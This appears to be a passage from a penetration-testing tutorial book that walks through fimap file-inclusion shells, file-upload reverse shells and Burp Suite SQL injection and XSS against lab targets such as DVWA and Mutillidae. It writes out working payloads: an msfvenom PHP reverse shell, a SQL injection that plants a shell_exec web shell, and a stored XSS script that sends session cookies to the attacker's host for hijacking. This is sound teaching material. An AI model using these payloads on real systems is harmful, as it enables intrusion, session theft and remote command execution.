The “-s” switch denotes single URL and the “-u” switch sets the target URL to scan. We will use the DNS-lookup Command Injection vulnerable page on the Mutillidae system.

When you run the above command, fimap will scan the URL and return a results report:

![](Images/image00787.jpeg)

As you can see in the output above, fimap finds a “Possible PHP-File Inclusion” vulnerability on the web page. Now all we need to do is run fimap again and put add the “-x” switch to have fimap exploit the vulnerability.

### Exploiting via Remote Shell

One of the great things about Fimap is its ability to create a remote shell with the vulnerable page.

1.  To do so, we simply run “fimap -x”:

![](Images/image00788.jpeg)

2.  A list of scanned domains will appear. Select the one we just scanned, “1”.
3.  A list of vulnerable pages will appear, select “1” again
4.  Now at the Available Attacks screen, select “#1 - Spawn Fimap Shell”

A remote shell should open up to the server if everything went correctly. Go ahead and run a couple commands to see that you do in fact have a remote shell to Mutillidae:

![](Images/image00789.jpeg)

And that is it; we now have a remote shell to the webserver! When done, enter “q” to exit the shell and return to the Fimap “Available Attacks” menu options:

![](Images/image00790.jpeg)

Exploit via Pentest Monkey’s Reverse Shell

Now, choose option 2 - “Spawn Pentestmonkeys reverse shell” from the “Available Attacks” menu. It will ask you to enter your Kali system’s IP address and a port to connect back to. Go ahead and enter your Kali IP and port 4444 when asked:  

![](Images/image00791.jpeg)

Fimap will then tell you to open another terminal prompt and run Netcat:

 Enter, “netcat -v -l -v -p 4444”

 Then just hit enter in fimap and you have a remote Netcat shell!

![](Images/image00792.jpeg)

We now have a reverse shell on our target webserver!

Mass Scanning

In the examples above we just target one vulnerable page. You can also scan an entire website for issues and have fimap harvest links from it and store them so they can be used with its mass scan feature.

1.  Simply run fimap and use the “-H” switch to tell it to harvest links, “-u” to tell it the target IP, “-d [x]” to tell it how deep to look for links and finally “-w [outputdirectory]” to tell it where to store the links, as shown below:

fimap -H -u 'http://192.168.1.68' -d 3 -w /tmp/urllist

![](Images/image00793.jpeg)

Now that Fimap knows what URLs to check, next we will scan all the URL’s for vulnerabilities.

2.  Enter, “fimap -m -l '/tmp/urllist'”

This will take quite a while to run as we told Fimap to pretty much vulnerability scan the entire Metasploitable VM for LFI and RFI exploits. But check out the results:

![](Images/image00794.jpeg)

Fimap found a possible 688 File Inclusion issues on the Metasploitable VM! You can scroll through the list and look at the returns. Or if you want to try to exploit one of the 688 issues, just type “Fimap -x” and have at it:

![](Images/image00795.jpeg)

Scanning with Google Dorks

Another interesting feature of Fimap is the ability to scan websites through Google using “Google Dorks”. You can scan the internet using any Google Dork string, though I will not cover this nor do I recommend running it due to possible ethical issues.

Conclusion

In this section we learned how to use the command Fimap to perform automated file inclusion attacks against a target website. We saw that fimap allows you to scan a single URL for vulnerabilities, or you can use its mass scan feature to scan an entire range of URLs for vulnerabilities and use these vulnerabilities to get a remote shell.

## Chapter 20

## File Upload

File upload is exactly what it sounds like, uploading a file or shell through a vulnerable web interface and then executing it. This is one of the simplest forms of exploit. The trick is finding out where the webserver stored the file so we can try to access remotely. One way to do this is to upload a test file and then simply trying to access it from the website.

For this section we will again be using the DVWA test environment in our Metasploitable VM.

![](Images/image00796.jpeg)

1.  Surf to the DVWA application and log in.
2.  Click on “DVWA Security” and set the security level to “low”:

![](Images/image00797.jpeg)

3.  From the DVWA menu, choose “Upload”
4.  Upload a file and see if the webserver gives us any clues as to where it stored. I simply created a text file called “helloworld.txt” containing, you guessed it, “Hello World!”
5.  Browse to and upload the file:

![](Images/image00798.jpeg)

As you can see from the picture above, DVWA is nice enough to give you the path to the upload directory. You would be pretty lucky if you actually received a message like this in real life. Let’s take a moment and analyze the current upload URL we have in the address bar:

http://192.168.1.135/dvwa/vulnerabilities/upload/#

The message in the previous image tells us that the file is stored back two directories from the present (../../) and then in the “hackable/uploads” directory. Something like this:

![](Images/image00799.jpeg)

Move back two directory levels:

![](Images/image00800.jpeg)

Then put our destination path in and we get the final address:

![](Images/image00801.jpeg)

Let’s try that out. Put the URL in your browser and surf to it. The web application should pull up our “Hello World” text message and display it as seen below:

![](Images/image00802.jpeg)

Well that was fun - We were able to upload a text file to the server and figure out where it was stored. But what can we do with this information? Could we upload a remote shell to the webserver?

### Remote Shell from File Upload

Because there is no file type verification test and the upload directory was directly available from the web we can simply generate a PHP based remote shell in Metasploit and upload it as a webpage to the server. We can then open the PHP page by surfing to it and the webserver will connect back to our Kali system running a multi-handler and open a full remote shell!

For this section we will use the “inline” PHP Meterpreter Reverse TCP shell. The inline version is similar to the regular PHP reverse shell but is not staged, and includes all the exploit code in one package.

1.  Create a PHP shell using msfvenom by typing:

msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.39 LPORT=4444 -f raw > shell.php

![](Images/image00803.jpeg)

For the payload we chose the PHP based Inline Meterpreter reverse shell. We set the IP address of the Kali system and the port we want to use. As usual we will need to add the “<?php” tag to the beginning and “?>” to the end of the code.

2.  Open the shellcode file in a text editor and add the tags as seen below:

<?php if (!isset($GLOBALS['channels'])) { $GLOBALS['channels…

?>

3.  Start Metasploit by typing, “msfconsole” in a terminal
4.  Start a handler service:

 use exploit/multi/handler

 set payload php/meterpreter_reverse_tcp

 set lhost 192.168.1.39

 set lport 4444

 exploit

5.  This will start the reverse handler as seen below:

![](Images/image00804.jpeg)

6.  Now just surf to the DVWA “Upload” page and upload the shell.php file.
7.  Finally, access the shell.php file through the Kali browser:

![](Images/image00805.jpeg)

And on our Kali system we should see this:

![](Images/image00806.jpeg)

A remote Meterpreter shell!

![](Images/image00807.jpeg)

We can now run commands to verify we do in fact have a remote shell:

![](Images/image00808.jpeg)

Or just type “shell” to jump into a direct shell:

![](Images/image00809.jpeg)

Notice that in the remote Linux shell there is no terminal prompt, you just type commands and the responses show up on your screen.

Conclusion

In this section we saw how allowing uploads to a server with no file restrictions or directory protection can allow a hacker to upload their own files to the server. In this case we successfully generated a PHP shell in Metasploit, uploaded it to the vulnerable web server creating a full remote shell.

## Chapter 21

## Burp Suite

In this chapter we will take a look at the feature rich tool, Burp Suite.

Author: Portswigger

Website:  [http://portswigger.net/burp/](http://portswigger.net/burp/)

![](Images/image00810.jpeg)
Kali Linux comes with the Burp Suite Free Edition installed (a professional version is available) which includes the following capabilities:

 Application-aware Spider

 Intercepting Proxy

 Advanced web application Scanner

 Intruder tool

As Burp is an intercepting proxy (it sits in between your browser and the website), it allows you to capture website traffic in transit and manipulate it. For this chapter we will be using our Windows 7 VM running the latest version of Mutillidae as a target. We will be using Burp Suite to explore one of the top threats against websites, SQL injection attacks.

![](Images/image00811.jpeg)

The Interface

You can start Burp in multiple ways - by typing “burpsuite” in a terminal window, selecting it from the Applications menu or the quick start bar. After Burp starts you will be greeted with the main interface made up of:

1.  The Tool Menu
2.  Filter Options Menu
3.  Site Map/ Scope Window
4.  URL Information Window
5.  Request/ Response Window

![](Images/image00812.jpeg)

Basically you select a target or tool from #1. Set any filter options you want in #2. View and select the website scope and sitemap in #3. View individual link information in #4 and lastly view HTML request/ responses in #5.

The Tool Menu (#1) contains the available actions that you can take when working with websites. These include the following tabs which we will be using in this chapter:

 TARGET SITE MAP – Shows a Site Map and project Scope

 PROXY – Used to set up and control the Intercepting Proxy

 SPIDER – Shows information on spidering targets

 INTRUDER – Automating attacks

 DECODER – Used to encode/ decode text in multiple formats

 COMPARER – For comparing differences between webpages/ responses

The Site Map Window (#3) shows all the target URL links available from either Burp’s passive scan that it performs by looking through webpages for links, or pages found during active spidering. Lastly, the Request/ Response Window (#5) shows actual html code that you can view and manipulate.

I have always been a ‘learn by doing’ type of person, so let’s just jump right in and see how to use the Burp Suite tools with some functional examples.

Target Site Map and Spidering

The first thing we need to do is set up the intercepting proxy in our web browser. In IceWeasel go to settings, preferences, advanced, and then  network. Under the Network tab, click Settings. Click “Manual Proxy Configuration” and then set the HTTP Proxy to “localhost” and port to “8080” then click “OK” as seen below:

![](Images/image00813.jpeg)

Now we need to turn off the intercepting proxy in Burp.

Click the “Proxy” tab, and make sure that Intercept is set to off in the intercept tab:

![](Images/image00814.jpeg)

When it is off, it will allow webpages to load normally without interruption. When intercept is on, Burp will activate the intercepting proxy and stop web page processing at each stage (send/ receive) and ask for permission to continue before it allows the transmission to continue. Later in this tutorial we will be using Burp with the intercept turned on quite a bit, but for spidering, you will want it off.

Now, on your Kali system surf to Mutillidae in your browser using [IP Address]/Mutillidae:

![](Images/image00815.jpeg)

Now if you look in Burp you should see that under the “Target” tab, it has filled in a lot of information that it found automatically in the Site Map window:

![](Images/image00816.jpeg)

Notice that a lot of external websites are listed. We only want to work on our local Mutillidae system, so we need to modify our “scope”.

1.  Click on the triangle in front of your Mutillidae IP Address
2.  Now single click on Mutillidae to highlight it.
3.  Right click on Mutillidae and click, “Add to Scope”:

![](Images/image00817.jpeg)

4.  Let’s clean up our Site Map listing a bit, click on the Filter Menu bar (#2 from the interface picture) and click “Show only In-Scope Items”:

![](Images/image00818.jpeg)

We now have a nice clean Site Map:

![](Images/image00819.jpeg)

Now let’s go ahead and Spider the entire Mutillidae Site.

1.  Right click on mutillidae in the Site Map.
2.  Click “Spider this Branch”:

![](Images/image00820.jpeg)

Burp will now spider the entire webpage. We can check on the Spider status at any time by clicking on the “Spider” tab in the tools menu:

![](Images/image00821.jpeg)

When the Spider is done, the Site Map will be much more complete. Click the triangle next to “Mutillidae” to view it:

![](Images/image00822.jpeg)

Intercepting Proxy

As mentioned earlier, when the intercepting proxy is turned on, it will intercept whatever information that would normally be sent to the target webpage and allows you to see and manipulate code. By doing this you can view variables that the website is using and change them to something different before sending it off to the web server. Let’s see this in action.

You will want to check the Options menu under the “Proxy” tab and make sure “Intercept Client Requests” is checked:

![](Images/image00823.jpeg)

It is also helpful to see the server responses, to do so, make sure that “Intercept Server Responses” is also checked:

![](Images/image00824.jpeg)

1.  Now, with the intercepting proxy set to off:

![](Images/image00825.jpeg)

2.  Surf to the Mutillidae login screen in Iceweasel (Just open your Mutillidae website and click “Login/ Register” from the top menu). You should see the following screen:

![](Images/image00826.jpeg)

3.  Now, turn on the intercepting proxy in Burp
4.  Then in Mutillidae, enter ‘test’ as both the username & password and click login.

When you click login, you will notice that Iceweasel seems to freeze. Well, it isn’t, Burp has intercepted our login attempt!

5.  Go back to Burp and check the Proxy page. You should see something like the screen shot below:

![](Images/image00827.jpeg)

It has captured the login request and is holding it. At this point we can see the actual code that would be sent to the web server. At the top you can see that it is a post to login.php and at the bottom you can see the username and password that were entered into the form. You can change anything you want on the page, and then click forward to send the modified form to the webserver for processing. Notice that the variables and data are color coded. On mine, the input variables are blue and the entered data is red.

 Change the username from ‘test’ to ‘ed’

 Change the password from ‘test’ to ‘pentest’:

![](Images/image00828.jpeg)

 Now click the “Forward” button, our modified request is sent to the server

 Press “Forward” one more time to finally login

When login is complete you should see that we have successfully logged in to Mutillidae, not as the user “test” which was entered into the website login form, but the user “Ed” that we changed to in Burp:

![](Images/image00829.jpeg)

This was just a quick example of how to intercept a webpage form and manipulate it putting in the data that we want. This ability will come in very handy later in this chapter. Intercept is a great tool, though I guarantee that until you get used to how it works, you will forget and leave it on and wonder why your web pages aren’t loading!

### Basic SQL Injection

Now let’s turn to Basic SQL Injection. With SQL injection attacks, we try to interact with the website’s underlying SQL database by using modified input. One of the most basic SQL Injection attacks is “' or 1=1-- ”. Let us see how this works.

1.  Turn the intercepting proxy off
2.  Logout of Mutillidae
3.  Now at the Login screen enter, “' or 1=1-- ” for the username. Make sure that there is a space after the double dash, and click Login:

![](Images/image00830.jpeg)

You will immediately be logged in as admin! This may not make sense until you look and see how this attack satisfies the underlying SQL statement by tricking it into always being true no matter what. The easiest way to see this is to send an invalid command to the SQL server via the input form and see if you get an error message.

4.  Click “logout”
5.  Now login again, but for the login name enter: ’test for both the username and password:

![](Images/image00831.jpeg)

This will generate the following error code:

![](Images/image00832.jpeg)

Look at the last line in the picture above, “Query: SELECT username FROM accounts WHERE username=''test';” this tells us exactly how the username is being used in a SQL statement.

The SQL statement is looking for: username=’test’

But when we put in the username that caused the error we entered: ‘‘test

What this did, is it passed the tic (‘) as part of the username, when the tic was put into the SQL statement it effectually closed the beginning tic for username, satisfying the SQL statement, causing it to include the additional word test into the SQL statement which isn’t valid. When we use ' or 1=1-- this closes the beginning username tic, then includes a valid SQL comparison (or 1=1) and finally adds a “-- ” at the end. 1=1 will always be true; it can actually be any true comparison. The dash, dash, space is also a valid SQL statement; it is the comment command, telling SQL to ignore the rest of the line!

So our input SQL statement goes from:

Query: SELECT username FROM accounts WHERE username='George';

This would be a valid request, selecting the username George, to:

Query: SELECT username FROM accounts WHERE username='' or 1=1-- ';

Which doesn’t include a username (notice the two tics together, which would normally include the username) but does include the comparative statement “or 1=1” which is a true statement. So for logging in, it simply pulls the first user from the database, the administrator!

This also works in the User Info screen (located at: OWASP 2013 > A1 Injection (SQL) > SQLi Extract Data > User Info (SQL)) quickly displaying all the users with their passwords:

![](Images/image00833.jpeg)

More Advanced Injection

The creators of Mutillidae have spent an enormous amount of time putting in tutorials and command examples in the Hints menus. In the newer versions of Mutillidae just toggle Hints to Enabled (1 - 5cr1pt K1dd1e) and a “Hints” menu will appear on the screen. This menu is custom made for each section of Mutillidae giving you an incredible amount of information, and makes for a very good learning tool. I highly recommend that you view the different modules in Mutillidae and read the extensive hints sections that go along with it. There are also links to exceptionally good training videos.

Now the bad news (kind of), I have found using different version of Mutillidae that the examples do not always work right out of the gate, and some tinkering is needed to get them functional. Which I think is a great learning experience!

Let’s take a look at one such example. In this section we will see how to find the number of columns in a table and pull data from the webserver host all through SQL injection.

1.  In Mutillidae, find this section under the SQL Injection Hints menu:

![](Images/image00834.jpeg)

We will be using the “user-info” page at: OWASP 2013  > A1 Injection (SQL)  >  SQLi Extract Data  >  User Info (SQL).

1.  To save some time we will not be using Burp, just copy the first command from the “Using advanced techniques” (shown in the image above) and paste it into the username field and click, “View Account Details”:

![](Images/image00835.jpeg)

This will return the following error:

![](Images/image00836.jpeg)

If you read through the message you will see that the cause is “The used SELECT statements have a different number of columns”. Pay close attention to error messages as this isn’t saying there was a problem with our command, but there was a problem with the number of columns. We are not using enough, “Nulls” in the beginning place fillers to satisfy the number of columns in the table.

The solution - Just add more nulls!

We can find the magic number of columns by just taking the statement, “' union select null -- ” (we don’t need the entire statement from earlier, just use this shortened version) adding an extra “null” to it and using it in the Username field until the error goes away. Don’t forget the space at the end of the command. We already know one null isn’t going to work, so let’s try two:

2.  Enter, “' union select null, null -- ”

![](Images/image00837.jpeg)

And when you click, “View Account Details” - You get the same error message…

This can be a bit frustrating, but literally you just keep adding null’s until it works without error. This technique is demonstrated in the creator’s You Tube Video:

[https://www.youtube.com/watch?v=UcbZUmuMy3U](https://www.youtube.com/watch?v=UcbZUmuMy3U)

The video shows him finding the number of nulls very quickly, but I will give you a hint, it takes many more than he shows. If you want to try this on your own, stop reading now and keep trying it until it works.

Okay, so how many nulls did it take? On mine I had to use a total of seven to get it to work!

' union select null, null, null, null, null, null, null --

When you get the correct number of nulls, this screen will be displayed:

![](Images/image00838.jpeg)

To see which listed field corresponds to which “null”, simply replace one null at a time with a number. So this command:

' union select null, 1, null, null, null, null, null --

Returns:

Username=1

Password=

Signature=

Notice we put a “1” in the second null position and it shows up in the Username field.

Now, let’s use that knowledge to dump a file from the Windows host. We will replace the number one with the first SQL command that we tried from the examples, putting the file read request in the right place and padding it with the correct amount of nulls:

' union select null, LOAD_FILE('../README') AS username, null, null, null, null, null --

When entered returns a readme file from the server!

![](Images/image00839.jpeg)

This works by using the command “Load_File” to open the README file and displays it in the username field.

### Remote Shell from SQL Injection

Now that we know the number of columns, getting a reverse shell is very simple. We will use the shell from the Mutillidae hints section, which works by creating a simple PHP command prompt (echo shell_exec($_REQUEST["pCommand"])) and copying it into the mutillidae directory as “backdoor.php” using the INTO DUMPFILE command.

1.  Simply copy the reverse shell example:

' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '..\\..\\htdocs\\mutillidae\\backdoor.php' --

2.  Add in the correct number of nulls, six in this case (the html code takes up one spot):

' union select null,null,null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '..\\..\\htdocs\\mutillidae\\backdoor.php' -- 

3.  Then just drop it into the username field and click “view account details”:

![](Images/image00840.jpeg)

At the bottom of the page notice you can input a command and run it with the “Execute Command” button. But that is not all; our little backdoor PHP shell has also been copied to the server as /mutillidae/backdoor.php! Now we can browse to the backdoor.php page anytime we want and execute commands on the server!

![](Images/image00841.jpeg)

Above is an example of running the ‘dir’ command in our new backdoor. And that is it; we now have a fully functional backdoor shell created with SQL injection! Play around with it and run different commands to see what works, what doesn’t, and what programs (like “calc”) open up on the local Windows system only.

### Burp Encoder/ Decoder

Now that you know the simple PHP shellcode worked through SQL injection try inserting different PHP shellcodes and getting them to work. You may need to URL encode your input to get it to process correctly. Burp includes an Encoder/ Decoder for just this function.

 Simply click on the “Decoder” menu option

 Paste your code into the top box

 Click “Encode as” and then “URL”:

![](Images/image00842.jpeg)

Then you simply copy and paste the resultant encoded text to replace the unencoded version.

Now that we have taken a look at basic SQL injection attacks, let’s look at automating attacks with Intruder.

Automating Attacks with Burp Intruder and Compare

Now we know how to use intercept to add in our own data, let’s see how this could be used in an attack by using Burp’s “Intruder” and “Compare” features. Intruder allows you to run automated attacks against captured code. Compare is used to find the differences between website pages; we can use compare to determine when an automated attack was successful.

First we will look at using Intruder to automate simple SQL injection techniques and then see how it can be used in a dictionary password attack.

Automated SQL Injection Example

Finding the number of columns in the SQL Injection example above took several manual iterations. What if we could automate SQL injection commands with Burp? We can with Intruder. In this example we will create a simple text list of the commands we tried above and have Burp try them for us automatically.

The “Sniper” attack attacks a single variable; you can choose different attack types in Burp to attack multiple variables with multiple payloads. But for this simple example, Sniper will work well.

1.  Create a text file called “union.txt” and save it to the Desktop. Include the following commands:

 ' union select null --

 ' union select null, null --

 ' union select null, null, null --

 ' union select null, null, null, null --

 ' union select null, null, null, null, null --

 ' union select null, null, null, null, null, null --

 ' union select null, null, null, null, null, null, null --

 ' union select null, null, null, null, null, null, null, null --

Notice that it is just the Union Select statement that we used with incrementing nulls. Don’t forget the space at the end.

2.  Now, on the Mutillidae ‘User Info’ page, capture a login request with Burp using the credentials, test/ test:

![](Images/image00843.jpeg)

3.  Now right click anywhere in the intercepted text and select “Send to Intruder”:

![](Images/image00844.jpeg)

4.  Notice the Intruder menu tab lights up, click on it.
5.  Now click the “Positions” tab:

![](Images/image00845.jpeg)

Notice that several sections of data are highlighted. At this point we only want to focus on the administrator’s password, so we need to clear all of the selected points and then select our own.

6.  On the menu on the right, click “clear”, this will erase all of the marked points.
7.  Now just highlight the value “test” in the “username” field:

![](Images/image00846.jpeg)

8.  Click “add” on the menu to the right
9.  Burp suite will now highlight the word “test” in the password field. Now that we have the field set that we want to attack, we need to set the payload.
10.  Click on the “payloads” tab
11.  Select “Runtime file” from the ‘Payload Type’ drop down box.
12.  Select our “union.txt” file:

![](Images/image00847.jpeg)

13.  Now in the “Intruder” menu at the very top, click “Start Attack”:

![](Images/image00848.jpeg)

A warning box will come up saying that the Intruder function in the free version of Burp is time throttled. The attack will work; it will just take a lot longer than it would if you are using the paid version of the program.

Burp will then go through and take every union select statement from the text file and insert it into the username field. It will record every separate response as a request number.

 When the automated attack is done, click on one of the “union select” lines

 click on the “response” tab in the bottom window

 and then click the “render” tab:

![](Images/image00849.jpeg)

When you get to the one with the correct number of columns you will see the correct username, password, signature screen above.

Intruder Wordlist attack

Let’s see if we can gain access to the administrator account by having Intruder use a wordlist against the password. Basically we supply Burp with a list of possible passwords and Burp attempts to login using each one, and then records the results. The Intruder feature in the free version of Burp is time throttled, meaning it really slows down the automated attack (about one attack per second) with a large wordlist this could take an incredible amount of time. So instead of using one of the wordlists that comes with Kali we will create our own short wordlist to use.

Using your favorite text editor, create a file called “mutillidae.txt” and save it to the Desktop. Put in the following passwords:

 12345

 password

 qwerty

 P@$$word

 admin

 adminpass

When done it should look like this:

![](Images/image00850.jpeg)

Now that our password list is complete, let’s use it to attack Mutillidae.

1.  Go to Mutillidae’s Login Page
2.  Turn on Intercept in Burp
3.  Enter admin for both the username and password and Login:

![](Images/image00851.jpeg)

4.  In the intercept window, right click and then click on “Send to Intruder”:

![](Images/image00852.jpeg)

5.  Click on the “Intruder” menu tab
6.  Now click the “Positions” tab:

![](Images/image00853.jpeg)

Notice that several sections of data are highlighted. At this point we only want to focus on the administrator’s password, so we need to clear all of the selected points and then select our own.

7.  On the menu on the right, click “clear”, this will erase all of the marked points.
8.  Now just highlight the value “admin” in the “password” field:

![](Images/image00854.jpeg)

9.  Click “add” on the menu to the right

Burp suite will now highlight the word “admin” in the password field. Now that we have the field set that we want to attack, we need to set the payload.

10.  Click on the “payloads” tab
11.  Select “Runtime file” from the ‘Payload Type’ drop down box:

![](Images/image00855.jpeg)

12.  Select the file we created, “/root/desktop/mutillidae.txt”:

![](Images/image00856.jpeg)

13.  Now in the “Intruder” menu at the very top, click “Start Attack”:

![](Images/image00848.jpeg)

When the automated attack is done, you should see a screen like this:

![](Images/image00857.jpeg)

At first the results don’t seem very helpful, but remember it is just putting values into the form and sending it to the webpage. If it worked, one response will be different from the other. If you look closely at the picture above you will see that Request 6 gave a status 302 and a length of 46225\. I wonder which one worked?

### Burp Comparer

Burp’s comparer feature allows you to quickly compare the results between one request/response and another. This comes in handy in cases where we use automated attacks and we want to compare the results to find differences between them. From the automated wordlist attack above we can:

1.  Right click on Request 6 and click “Send to Comparer (Response)”:

![](Images/image00858.jpeg)

We need something to compare it with, so let’s use Request 0, which is the baseline request. You may need to minimize Burp Suite to find the result windows again, it tends to hide sometimes.

2.  Rick click on Request 0 and click “Send to Compare (Response)”:

![](Images/image00859.jpeg)

3.  Now click on the “Compare” menu tab

You will see the two responses that we sent to the comparer. On the bottom right choose compare by “Words”. Both page responses will be shown side by side with a color coded map showing the differences. Click the “Sync View” box and scroll down the page looking for differences.

On the baseline page we will see the words, “Not Logged In”:

![](Images/image00860.jpeg)

But on the side that contains the page we think worked, we should find “Logged in Admin” and “g0t t00t?”:

![](Images/image00861.jpeg)

So, Request 6 from the intruder that used the password “adminpass” seemed to work! But let’s make sure, go ahead and try to login to Mutillidae with the username admin with the password adminpass (Don’t forget to turn off the intercept proxy):

![](Images/image00862.jpeg)

Looks like we have a winner! So by using intruder, we can create automated attacks and we can take the output of those attacks and put them into the Comparer to find out which attack actually did work. Though not really practical in the free version due to the time throttle, this demonstrates some of the more advanced capabilities of the full version.

Take a few moments and check out the other Attack methods built in to Intruder:

 Battering Ram

 Pitchfork

 Cluster Bomb

The process to use them is similar to above, but they give you more capabilities of attack multiple variables with multiple payloads.

### XSS (Cross Site Scripting Attacks) with Burp 

SQL Injection and XSS attacks are two of the most common types of web application attacks. We have talked about Basic SQL injection attacks earlier in the chapter. Let’s take a few minutes and look at XSS attacks using Burp. Where SQL injection vulnerabilities usually involve the web server’s database, XSS focuses on using scripts to attack clients. Therefore the focus is usually more on the clients than on the server database. There are two main types of XSS attacks:

 Reflective or Non-Persistent

 Stored or Persistent

First let’s look at Reflective XSS attacks. Reflective XSS attacks usually target a user’s browser and are temporary. A malicious XSS link is sent to a target via e-mail or a specially modified link is used to directly attack a server.

Reflective XSS

In this section we will demonstrate this attack by modifying a DVWA URL to include JavaScript. The first step is to find a vulnerable page.

1.  In Kali, go ahead and surf to and log into DVWA. Make sure that the security is set to “low” and click on the “XSS reflected” tab.
2.  Notice the URL at the top of the page:

http://192.168.1.68/dvwa/vulnerabilities/xss_r/

3.  Type in a name and click submit. I used the name “Fred”.

The friendly website comes back immediately and says, “Hello Fred”, how very nice. Now, notice the change in the URL:

http://192.168.1.68/dvwa/vulnerabilities/xss_r/?name=Fred# 

Let’s compare the two:

![](Images/image00863.jpeg)

The only difference is the addition of “?name=Fred#”. This part apparently is the command used to display the username. What if we insert a simple script to display “Hello Word!” into the URL?

Let’s use the basic code: <script>alert("Hello World!")</script>

4.  Enter the following URL:

192.168.1.68/dvwa/vulnerabilities/xss_r/?name=<script>alert("Hello World!")</script>Fred#

When we surf to this page and we get a pop-up box:

![](Images/image00864.jpeg)

Click “OK” to close the box and notice that the webpage correctly says “Hello Fred”, as we left the name “Fred” at the end of the script. This is all well and good, but doesn’t perform anything useful to an attacker other than verifying that the webpage is vulnerable to reflective XSS attacks. So, what else can we do?

5.  We could grab the session cookie by using the code:

http://192.168.1.68/dvwa/vulnerabilities/xss_r/?name=<script>alert (document.cookie)</script>

This should return the security level and the session ID cookie:

![](Images/image00865.jpeg)

Let’s see how we can take this attack further using a Persistent XSS attack. We will switch gears a bit and switch over to the Mutillidae site.

### Persistent XSS with Burp

A stored XSS attack or Persistent XSS is a malicious link usually stored on a server that is used to attack those that visit the site. Let’s see a quick example of a Persistent XSS vulnerability using Mutillidae:

1.  Make sure the Burp Intercepting proxy is off.
2.  Open Iceweasel in Kali and surf to OWASP 2013 > A3 Cross Site Scripting > Persistent (Second Order) > Add to your Blog.
3.  Enter “<script>alert("Hi!");</script>” and click “Save Blog Entry”:

![](Images/image00866.jpeg)

A pop up box will open saying, “Hi!” This is interesting, but not very helpful; let’s see if we can get more useful information. There are numerous ways to do this, but let’s try this:

4.  Enter and Save, “<iframe src=# onmouseover="alert(document.cookie)"></iframe>”

A post is created as anonymous with nothing in the comment section except a large empty box. But if someone mouses over the box, this pops up on the screen:

![](Images/image00867.jpeg)

Cookie information! Again this is interesting but it is our (the attacker’s) cookie information. There must be a way to get the website to give us cookie information from other visitors.

Make sure Apache isn’t running on Kali and start a Netcat session.

5.  Open a new terminal
6.  Type, “service apache2 stop”
7.  And then type, “nc -lvp 80”

This will start Netcat on our Kali system in listening mode. Now we need to get a script on the Mutillidae site that will call out to Kali and give us a session cookie of the currently logged in user. Let’s use the example from the provided XSS Hints section in Mutillidae, but modify it to call out our Kali system:

<script> new Image().src="http://192.168.1.39/?cookie="+encodeURI(document.cookie); </script>

Once this Blog entry is saved, it creates a blank image that looks to Kali for its source. As it is a blank image, nothing will be displayed in the comment section of the Blog entry. But if you look closely it also adds the document cookie to the call.

In Netcat we should see this:

![](Images/image00868.jpeg)

Notice in the highlighted section above that Netcat has captured the Cookie information! Now that we are able to recover cookie information from the target website, what can we do with it? How about impersonate a user?

Let’s see if we can login as admin by just using the captured cookie information.

1.  Login to Mutillidae as Admin (admin / adminpass)
2.  Surf to “View Someone’s Blog”
3.  Make sure Netcat is running on Kali
4.  Choose Author “All” & then click “View Blog Entries”

In Netcat we should capture the Admin user’s cookie information:

cookie=showhints=1;%20username=admin;%20uid=1;%20PHPSESSID=ph9vhjlshvq41tvthnh9iuo431

5.  Logout of Mutillidae
6.  Now turn on Burp’s intercepting proxy
7.  Login as a bogus user: (test1 / test1)

Now in Burp, go to the Intercepting Proxy and click on “Headers”:

![](Images/image00869.jpeg)

Notice the line item named “Cookie”, does that look familiar? Now go back to the Raw Tab and replace the Cookie line with the one we captured (I replaced the %20’s with regular spaces):

Cookie: showhints=1; username=admin; uid=1; PHPSESSID=ph9vhjlshvq41tvthnh9iuo431

It should look something like this:

POST /mutillidae/index.php?page=login.php HTTP/1.1

Host: 192.168.1.93
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.93/mutillidae/index.php?page=login.php&popUpNotificationCode=LOU1
Cookie: showhints=1;%20username=admin;%20uid=1;%20PHPSESSID=6lqtaptpk40h3c9ir65cp3tem1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

Now simply “Forward” the requests to send our modified login with the admin cookie. Notice at the bottom the username and password is still set to “test1”. But when the login sequence is complete it says, “You are logged in as admin”:

![](Images/image00870.jpeg)

This is just a quick example. There are many other things you could do. For example, the Hints section reveals how to force a user to log out when they mouse over the comment:

![](Images/image00871.jpeg)

What if we simply called a different website altogether instead of just a page in Mutillidae? Or better yet, what if we created a mirror image of this website using the Social Engineering Toolkit and simply transfer the users to this webpage? I leave these as options for you to explore on your own.

New “Collaborator” Feature

Burp has just introduced a new feature called “Collaborator”.  This exciting new component runs on a public web server and allows Burp to detect additional security issues that it has not been able to find before. It is currently in Beta level, but looks to be very promising:

[http://blog.portswigger.net/2015/04/introducing-burp-collaborator.html](http://blog.portswigger.net/2015/04/introducing-burp-collaborator.html)

Conclusion

In this section we have seen how Burp suite is an exceptional tool to perform website security testing. We used Burp to intercept and change data, learned about SQL injection and how to use Burp in automating attacks. We also looked at XSS attacks using Burp and Mutillidae. We will look deeper into performing SQL injection and XSS based attacks in the next couple chapters.

The creators of Mutillidae have spent a lot of time creating built in tutorials and videos which are included in the Hints section. I highly recommend checking them out and working through them for a much greater understanding of Burp Suite and the OWASP Top Ten vulnerabilities.

Resources

 OWASP’s website: [https://www.owasp.org/index.php/Main_Page](https://www.owasp.org/index.php/Main_Page)

